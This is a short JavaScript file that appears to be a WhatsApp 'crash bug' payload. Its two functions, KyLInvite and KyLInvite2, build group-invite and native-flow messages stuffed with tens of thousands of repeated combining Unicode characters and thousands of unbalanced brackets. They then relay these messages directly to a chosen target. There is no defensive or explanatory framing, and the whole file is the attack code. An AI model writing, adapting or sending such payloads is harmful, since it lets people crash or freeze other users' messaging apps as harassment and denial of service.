async function KyLInvite(target) {
  const MemekMelar = "ꦾ".repeat(5000);
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "ky" + "ꦾ".repeat(2500),
      caption: "ky"+ "ꦾ".repeat(2000),
      body: {
        text:
          "ᴋᴀʏʟᴀ ᴇᴍᴘᴇʀᴏʀ" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(5000) + "[".repeat(5000), 
        buttons: [
       {
            name: "single_select",
            buttonParamsJson: MemekMelar
        },
        {
            name: "call_permission_request",
            buttonParamsJson: MemekMelar
         }
      ]
    },
  };

  await ky.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function KyLInvite2(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ꦽ".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "ky" + "ꦾ".repeat(2500),
      caption: "ky៝"+ "ꦾ".repeat(2000),
      body: {
        text:
          "ᴋᴀʏʟᴀ ᴇᴍᴘᴇʀᴏʀ" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
  };
  await ky.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}